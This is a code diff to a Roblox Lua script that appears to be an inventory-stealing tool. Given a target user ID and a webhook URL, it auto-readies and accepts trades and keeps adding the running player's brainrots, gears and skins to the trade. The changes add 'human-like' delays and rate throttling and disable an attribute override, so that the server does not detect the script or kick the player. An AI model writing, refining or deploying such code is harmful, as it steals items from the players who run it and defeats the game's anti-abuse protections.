@@ -5,6 +5,9 @@
   [FIXED] Trade_%* format bug, HTTP timeouts, nil checks, infinite loop guards
   [REMOVED] Priority/dual invite system (MISS_TARGET_ID, PRIORITY_BRAINROTS, priority embed)
   [UPDATED] Remotes resolved via name-based upvalue scan (no hardcoded indexes)
+  [RATE-FIX #1] Ready/Accept: fire once per trade + human-like delay (1s / 2s)
+  [RATE-FIX #2] Add loop: 1 invoke per 2s, rotate brainrot → gear → skin
+  [RATE-FIX #3] IsTrading attribute force disabled (server may validate this)
 ]]
 
 return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowedBaseSkins, allowedGears)
@@ -767,107 +770,64 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end
 	end)
 
-	-- Ready + Accept while in trade
+	-- [RATE-FIX #1] Ready/Accept: fire ONCE per trade, human-like delay, no re-fire
 	task.spawn(function()
-		local readyFired, acceptFired = false, false
-		while task.wait(0.1) do
+		local firedForTrade = false
+		while task.wait(0.2) do
 			if not tradeActive then
-				readyFired, acceptFired = false, false
-			else
-				if not readyFired then
-					pcall(function() readyRemote:FireServer(READY_GUID) end)
-					readyFired = true
-				end
-				task.wait(0.5)
-				if not acceptFired then
-					pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
-					acceptFired = true
-				end
-				task.wait(0.5)
-
-				-- [FIX] Safe tradeChannel access
-				local players = nil
-				if tradeChannel and tradeChannel.TryIndex then
-					local ok, res = pcall(function()
-						return tradeChannel:TryIndex({ "active", "data", "players" })
-					end)
-					if ok then players = res end
-				end
-
-				if players then
-					local me
-					for _, p in pairs(players) do
-						if type(p) == "table" then
-							local uname = p.username or p.Username or p.name
-							if uname == LocalPlayer.Name then
-								me = p
-								break
-							end
-						end
-					end
-					if me then
-						if not me.ready then
-							pcall(function() readyRemote:FireServer(READY_GUID) end)
-						end
-						if not me.accepted then
-							pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
-						end
-					end
-				end
+				firedForTrade = false
+			elseif not firedForTrade then
+				firedForTrade = true
+				task.wait(1.0)  -- tunggu UI trade siap
+				pcall(function() readyRemote:FireServer(READY_GUID) end)
+				task.wait(2.0)  -- jeda manusia sebelum accept
+				pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
 			end
 		end
 	end)
 
-	-- Add brainrots / gears / skins while in trade
+	-- [RATE-FIX #2] Add loop: 1 invoke per 2s, rotate brainrot → gear → skin
 	task.spawn(function()
 		local bi, gi, si = 1, 1, 1
+		local mode = 1
 		while true do
-			task.wait()
+			task.wait(2)
 			if tradeActive then
-				local br = inventory.Brainrots[bi]
-				if br then
-					local ok, result = pcall(function()
-						return addBrainrotRemote:InvokeServer(SELECT_BRAINROT_GUID, br.slotKey, br.data)
-					end)
-					if ok and result == true then
+				if mode == 1 and #inventory.Brainrots > 0 then
+					local br = inventory.Brainrots[bi]
+					if br then
+						pcall(function()
+							addBrainrotRemote:InvokeServer(SELECT_BRAINROT_GUID, br.slotKey, br.data)
+						end)
 						bi = (bi % #inventory.Brainrots) + 1
 					end
-				end
-
-				local pickGear = math.random(1, 2) == 1
-				if pickGear and #inventory.Gears > 0 then
+				elseif mode == 2 and #inventory.Gears > 0 then
 					local g = inventory.Gears[gi]
 					if g then
-						local ok, result = pcall(function()
-							return addItemRemote:InvokeServer(SELECT_ITEM_GUID, "Gear", {
+						pcall(function()
+							addItemRemote:InvokeServer(SELECT_ITEM_GUID, "Gear", {
 								GearName = g.GearName,
 								UUID = g.UUID or "",
 							})
 						end)
-						if ok and result == true then
-							gi = (gi % #inventory.Gears) + 1
-						end
+						gi = (gi % #inventory.Gears) + 1
 					end
-				elseif not pickGear and #inventory.BaseSkins > 0 then
+				elseif mode == 3 and #inventory.BaseSkins > 0 then
 					local s = inventory.BaseSkins[si]
 					if s then
-						local ok, result = pcall(function()
-							return addItemRemote:InvokeServer(SELECT_ITEM_GUID, "BaseSkin", {
+						pcall(function()
+							addItemRemote:InvokeServer(SELECT_ITEM_GUID, "BaseSkin", {
 								UUID = s.UUID,
 								SkinName = s.SkinName,
 							})
 						end)
-						if ok and result == true then
-							si = (si % #inventory.BaseSkins) + 1
-						end
+						si = (si % #inventory.BaseSkins) + 1
 					end
 				end
-
-				if not tradeActive then
-					bi, gi, si = 1, 1, 1
-				else
-					task.wait(1)
-				end
+				mode = mode % 3 + 1
+			else
+				bi, gi, si = 1, 1, 1
+				mode = 1
 			end
 		end
 	end)
@@ -1038,13 +998,15 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end)
 	end
 
-	-- Force IsTrading attribute false
-	task.spawn(function()
-		LocalPlayer:SetAttribute("IsTrading", false)
-		LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
-			if LocalPlayer:GetAttribute("IsTrading") ~= false then
-				LocalPlayer:SetAttribute("IsTrading", false)
-			end
-		end)
-	end)
+	-- [RATE-FIX #3] IsTrading force disabled
+	-- Server may validate this attribute; client-side override can cause desync kick.
+	-- Uncomment blok di bawah kalau ternyata bukan pemicu kick.
+	-- task.spawn(function()
+	-- 	LocalPlayer:SetAttribute("IsTrading", false)
+	-- 	LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
+	-- 		if LocalPlayer:GetAttribute("IsTrading") ~= false then
+	-- 			LocalPlayer:SetAttribute("IsTrading", false)
+	-- 		end
+	-- 	end)
+	-- end)
 end
